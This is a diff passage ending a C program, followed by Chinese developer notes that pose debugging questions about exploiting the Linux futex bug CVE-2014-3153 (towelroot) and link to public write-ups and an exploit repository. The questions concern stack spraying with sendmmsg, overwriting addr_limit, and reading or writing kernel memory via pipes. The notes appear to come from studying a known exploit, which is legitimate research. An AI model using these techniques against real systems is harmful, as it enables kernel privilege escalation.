+pthread_join(p1, NULL);
+pthread_join(p2, NULL);
+
+munmap(ptr, 0x100000);
+return 0;
 }
 
 
+开发调试过程中遇到的几个疑问和几个值得关注的点：
+1. 在第二次调用futex_requeue之前，为什么要先创建几个线程
+
+2. 通过sendmmsg布局栈空间控制栈节点时，为什么需要循环调用，调用一次可以吗
+
+3. 改写addr_limit之后，直接通过内核地址解引用读写内核不行，需要通过pipe等方式间接读写
+
+4. 上面调试过程中，第二次调用futext_requeue时，q->rt_waiter还是正常，接下来futex_lock_pi时，发现q->rt_waiter被置空，什么时候置空的，没看到
+
+5. 同样是第二次调用futex_requeue，中间调用futex_proxy_trylock_atomic()，这里实际调试返回了-22，预想返回1成功获取锁，这里是哪里搞错了？
 
 
+6.通过sendmmsg布局栈空间时，需要将构造节点的prio覆写为-1可以正常使用，理论上覆写节点只要比较小应该就可以，例如覆盖为120的时候理论上也是可以的，但实际利用会失败，为什么？是sendmmsg调用出错了吗？
+
+
+参考：
+http://blog.topsec.com.cn/ad_lab/cve2014-3153/
+http://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/
+https://github.com/timwr/CVE-2014-3153
